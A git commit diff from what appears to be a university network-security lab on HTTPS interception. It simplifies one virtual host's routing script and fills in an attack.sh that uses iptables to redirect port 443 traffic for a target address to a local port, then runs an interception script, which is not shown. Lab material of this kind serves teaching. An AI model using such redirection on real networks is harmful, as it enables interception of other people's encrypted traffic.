5c45d1036681163c5bd9e1fb27ffb8265ba39674
Amelie Risi <amerisi@emi.u-bordeaux1.fr>
2018-02-07 12:08:46 +0100

    https-interception: prepare attack.sh and repare start.sh in grave

--- https-interception/grave/start.sh
+++ https-interception/grave/start.sh
@@ -1,7 +1,4 @@
 #!/bin/sh
 hostname grave
 ifconfig eth0 147.210.13.2/24
-ifconfig eth1 147.210.14.1/24
-echo 1 > /proc/sys/net/ipv4/ip_forward
 route add -net 147.210.12.0/24 gw 147.210.13.1
-route add -net 147.210.15.0/24 gw 147.210.14.2
--- https-interception/immortal/attack.sh
+++ https-interception/immortal/attack.sh
@@ -1,3 +1,5 @@
 #!/bin/sh
 
-echo "TODO..."
+iptables -t nat -F
+iptables -t nat -A PREROUTING -d 147.210.12.1 -p tcp --dport 443 -j REDIRECT --to-port 4242
+/mnt/host/https-interception.py
